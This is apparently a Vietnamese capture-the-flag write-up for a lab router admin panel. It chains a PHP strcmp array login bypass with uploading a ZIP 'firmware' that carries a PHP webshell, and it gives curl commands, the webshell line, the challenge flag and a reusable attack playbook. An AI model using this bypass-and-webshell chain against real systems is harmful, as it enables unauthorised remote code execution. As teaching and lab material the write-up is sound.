# router-firmware-upload

- **Category:** Web
- **File đề:** target `10.3.204.206` (trang quản trị router). Repo kèm README + ảnh (index/login/panel/updatedFirmware/result/ls/flag) + `1.1.zip` (667 bytes — firmware mẫu, md5 `dcc2024f732ae75f7960058f58e42295`).

## Tóm tắt đề

Trang quản trị router có 2 lỗ hổng xâu chuỗi: (1) **bypass đăng nhập bằng PHP array / type juggling**, (2) **upload "firmware" là ZIP chứa PHP được server thực thi** → RCE. Dùng để `ls` và đọc flag.

## Phân tích (chi tiết)

**Nền tảng.**
1. **PHP type juggling / array bypass:** nhiều app PHP so sánh mật khẩu kiểu `if ($pass == $stored)` hoặc `strcmp($pass,$stored)==0`. Nếu gửi `password[]=x` (mảng) thay vì chuỗi: `strcmp(array, string)` trả **NULL** (PHP cũ) → `NULL == 0` là **true** → **bypass đăng nhập**.
2. **Upload webshell:** chức năng cập nhật firmware nhận ZIP chứa file PHP; nếu server **chạy PHP** trong file upload, chèn `<?php system($_POST['cmd']); ?>` là có **RCE**.

Trinh sát:
- Trang login (ảnh `2-login.png`). Thử gửi `password` dạng mảng:
  ```
  POST /login   username=admin&password[]=anything
  -> đăng nhập thành công (bypass).
  ```
- Sau khi vào: form "Firmware Update" cho upload ZIP, kèm file mẫu `1.1.zip` (gồm 1 PHP in "Version: 1.1 updated!" và 1 TXT).

Server giải nén ZIP và **thực thi file PHP** khi bấm "Check update result" (ảnh `5-result.png`). Vậy chỉ cần nhét webshell vào file PHP, nén lại đúng cấu trúc (PHP + TXT như mẫu), upload → có RCE để `ls` và `cat` flag.

## Kỹ thuật áp dụng (+ VÌ SAO)

- **PHP array bypass (`password[]`)** — VÌ `strcmp(array, string)` trả NULL và `NULL == 0` là true trong loose comparison → vào được mà không cần mật khẩu.
- **Upload ZIP chứa webshell PHP** — VÌ server tự giải nén và chạy PHP trong firmware; nhét `system($_POST['cmd'])` là có RCE.
- **Giữ cấu trúc ZIP giống mẫu (`1.1.zip`)** — VÌ server kỳ vọng đúng layout firmware (PHP + TXT) mới xử lý.

## Lời giải chi tiết (bước + code/lệnh/payload sạch)

```bash
# 1) Bypass login bằng array:
curl -i -c c.txt -d 'username=admin&password[]=x' http://10.3.204.206/login

# 2) Sửa file PHP trong 1.1.zip, thêm webshell:
#    chèn vào cuối file PHP:  <?php system($_POST['cmd']); ?>
#    rồi nén lại CẢ PHP + TXT đúng cấu trúc mẫu:
zip firmware.zip update.php version.txt

# 3) Upload firmware.zip qua form "Firmware Update", bấm "Check update result".

# 4) RCE:
curl -b c.txt -d 'cmd=ls'            http://10.3.204.206/<đường_dẫn_php_đã_upload>   # thấy flag.php
curl -b c.txt -d 'cmd=cat flag.php'  http://10.3.204.206/<đường_dẫn_php_đã_upload>   # lấy flag
```

## Flag

```
flag{94550b955569733446ebf2105ed54e9c22276d912befab7a4c}
```

Router "broken" do (1) login bypass bằng array và (2) upload firmware cho chạy PHP tùy ý (RCE).

## Gặp lại thì xử lý thế nào (playbook)

1. Form login PHP ⇒ thử `password[]=x` (array) và các giá trị magic hash (`0e...`) để bypass loose comparison.
2. Chức năng upload "firmware"/"plugin"/"theme" nhận archive ⇒ thử nhét webshell, giữ đúng cấu trúc mẫu.
3. Nếu flag ở `flag.php`, `cat` ra source (PHP không render) hoặc dùng `php://filter` để lấy nội dung thô.
4. Bị chặn phần mở rộng ⇒ thử `.phtml`/`.php5`, hoặc chèn PHP vào file hợp lệ.
5. Giữ cookie phiên sau bypass để các request RCE dùng lại.
